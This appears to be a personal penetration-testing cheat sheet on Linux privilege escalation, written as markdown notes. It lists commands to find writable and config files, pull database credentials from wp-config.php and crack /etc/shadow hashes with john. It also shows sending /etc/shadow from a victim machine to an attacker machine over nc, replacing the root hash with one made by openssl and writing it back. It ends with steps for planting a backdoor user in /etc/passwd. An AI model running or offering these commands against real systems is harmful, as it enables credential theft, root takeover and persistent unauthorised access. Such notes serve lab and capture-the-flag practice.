
## To find every writable file in system
```
find / -writable -type d 2>/dev/null
```

## find imp files
```
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

## Creds hunt
```
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```
## Permission Path

su root -> go check in /etc/passwd (if user available and has hash) -> then check in /etc/shadow for hash -> verify hash from shadow file

```
ls -la /etc/passwd && la -la /etc/shadow && ls -la /etc/sudoers
```

***

## Shadow file ---- username & password hashes stored here

### read hash from /etc/shadow

* [ ] john 'hash\_from\_shadow' > hash
* [ ] john hash --wordlist=rockyou.txt

### if it has write permission then,

we can manipulate the file and change hashes for the root

> if we have ssh shell, it may not support nano/vim then we have to change files via nc

* [ ] first, we have to start nc in victim machine

```
nc -nvlp 5555 < /etc/shadow
```

* [ ] then start nc in attack machine with victim ip and port
* [ ] so, file come in our attack machine. now create new hash with openssl/mkpasswd

> even we change hash type while transferring shadow file then it still works

#### Extra Note:

< \[/path/name] means to share file from thic pc

\> \[name] means to receive file from other pc as that specified name

> [!NOTE]
> mkpasswd not available in other distros (only in kali), that's why openssl is preferred


***

### make hash

* [ ] openssl passwd -6 hello
* [ ] now change old hash to new one
* [ ] start listening on attack machine
* [ ] nc attack\_ip 5555 < shadow
* [ ] nc -nvlp 5555 > /etc/shadow

![[image 43.png]]

***

## Passwd file ---- username stores here

* It has read permission for everyone
* it's super **RARE** that hash directly written here and it's not detect in any automated tool like linpeas
* but if, it has write permission then

1. remove x. so it won't check in shadow file
2. directly write hash there in /etc/passwd
3. create another user in /etc/passwd as backdoor

***

## Sudoers file --- give permission for specific users

* check permission for this file
